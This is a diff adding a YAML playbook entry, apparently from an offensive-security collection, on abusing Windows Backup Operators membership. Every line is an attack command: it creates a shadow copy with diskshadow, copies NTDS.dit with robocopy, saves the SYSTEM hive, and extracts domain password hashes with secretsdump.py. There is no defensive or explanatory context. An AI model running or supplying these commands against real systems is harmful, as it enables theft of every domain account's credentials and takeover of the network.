@@ -1,0 +1,15 @@
+name: BackupOperators
+description: Backup Operators can backup NTDS.dit and SAM database
+commands:
+- '# Create shadow copy and extract NTDS.dit'
+- diskshadow /s script.txt
+- '# script.txt: set context persistent nowriters; add volume c: alias x; create; expose %x% z:'
+- ''
+- '# Copy NTDS.dit from shadow copy'
+- robocopy z:\windows\ntds . ntds.dit
+- reg save HKLM\SYSTEM system.hive
+- ''
+- '# Extract hashes'
+- secretsdump.py -ntds ntds.dit -system system.hive LOCAL
+opsec: []
+references: []
